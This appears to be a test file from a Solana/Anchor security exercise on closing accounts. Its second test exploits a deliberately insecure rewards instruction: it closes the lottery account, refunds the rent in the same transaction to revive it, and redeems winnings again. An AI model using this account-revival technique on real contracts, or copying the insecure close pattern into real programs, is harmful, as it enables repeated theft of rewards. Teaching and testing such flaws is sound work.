import * as anchor from "@project-serum/anchor"
import { Program } from "@project-serum/anchor"
import { ClosingAccounts } from "../target/types/closing_accounts"
import { PublicKey, Keypair, SystemProgram, Transaction } from '@solana/web3.js'
import { getOrCreateAssociatedTokenAccount, createMint, TOKEN_PROGRAM_ID, getAccount } from "@solana/spl-token"
import { safeAirdrop } from "./utils/utils"
import { expect } from 'chai'
import { associated } from "@project-serum/anchor/dist/cjs/utils/pubkey"

describe("closing-accounts", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env())
  const provider = anchor.AnchorProvider.env()
  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>
  const authority = Keypair.generate()
  let userAta: PublicKey = null
  let rewardMint: PublicKey = null
  let mintAuth: PublicKey = null


  it("Enter lottery", async () => {
    // Add your test here.
    const [lotteryEntry, bump] = await PublicKey.findProgramAddressSync(
      [Buffer.from("test-seed"), authority.publicKey.toBuffer()],
      program.programId
    )
    const [mint, mintBump] = await PublicKey.findProgramAddressSync(
      [Buffer.from("mint-seed")],
      program.programId
    )
    mintAuth = mint

    await safeAirdrop(authority.publicKey, provider.connection)

    rewardMint = await createMint(
      provider.connection,
      authority,
      mintAuth,
      null,
      6
    )

    const associatedAcct = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      authority,
      rewardMint,
      authority.publicKey
    )
    userAta = associatedAcct.address


    // tx to enter lottery
    await program.methods.enterLottery()
    .accounts({
      lotteryEntry: lotteryEntry,
      user: authority.publicKey,
      userAta: userAta,
      systemProgram: SystemProgram.programId
    })
    .signers([authority])
    .rpc()
  })

  it("close + refund lottery acct to continuously claim rewards", async () => {

    const [lotteryEntry, bump] = await PublicKey.findProgramAddressSync(
      [Buffer.from("test-seed"), authority.publicKey.toBuffer()],
      program.programId
    )

    // log rewards minted
    let tokenAcct = await getAccount(
      provider.connection,
      userAta
    )
    console.log("User balance before reward redemption: ", tokenAcct.amount.toString())

    const tx = new Transaction()

    // instruction claims rewards, program will try to close account
    tx.add(
      await program.methods.redeemWinningsInsecure()
      .accounts({
        lotteryEntry: lotteryEntry,
        user: authority.publicKey,
        userAta: userAta,
        rewardMint: rewardMint,
        mintAuth: mintAuth,
        tokenProgram: TOKEN_PROGRAM_ID
      })
      .instruction()
    )

    // user adds instruction to refund dataAccount lamports
    const rentExemptLamports = await provider.connection.getMinimumBalanceForRentExemption(82, "confirmed")
    tx.add(
      SystemProgram.transfer({
          fromPubkey: authority.publicKey,
          toPubkey: lotteryEntry,
          lamports: rentExemptLamports,
      })
    )
    // tx is sent
    const txSig = await provider.connection.sendTransaction(tx, [authority])
    await provider.connection.confirmTransaction(txSig)

    // log rewards minted
    tokenAcct = await getAccount(
      provider.connection,
      userAta
    )
    console.log("User balance after first redemption: ", tokenAcct.amount.toString())

    // claim rewards for a 2nd time
    await program.methods.redeemWinningsInsecure()
      .accounts({
        lotteryEntry: lotteryEntry,
        user: authority.publicKey,
        userAta: userAta,
        rewardMint: rewardMint,
        mintAuth: mintAuth,
        tokenProgram: TOKEN_PROGRAM_ID
      })
      .signers([authority])
      .rpc()

    tokenAcct = await getAccount(
      provider.connection,
      userAta
    )

    // log rewards minted
    console.log("User balance after second redemption: ", tokenAcct.amount.toString())

  })
})
